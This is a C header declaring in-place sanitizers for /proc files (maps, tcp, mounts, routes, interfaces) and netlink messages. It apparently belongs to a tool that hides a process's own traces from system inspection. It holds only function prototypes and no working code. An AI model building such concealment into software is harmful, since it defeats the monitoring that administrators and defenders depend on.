/**
 * sanitizer.h — In-place buffer sanitization for /proc pseudo-files and netlink messages.
 */

#pragma once

#include <sys/types.h>

void sanitize_maps(char* buf, ssize_t* bytes_read, const char* self_path);
void sanitize_tcp(char* buf, ssize_t* bytes_read);
void sanitize_status(char* buf, ssize_t* bytes_read);
void sanitize_mounts(char* buf, ssize_t* bytes_read);
void sanitize_net_dev(char* buf, ssize_t* bytes_read);
void sanitize_if_inet6(char* buf, ssize_t* bytes_read);
void sanitize_route(char* buf, ssize_t* bytes_read);
void sanitize_netlink(void* buf, ssize_t len);
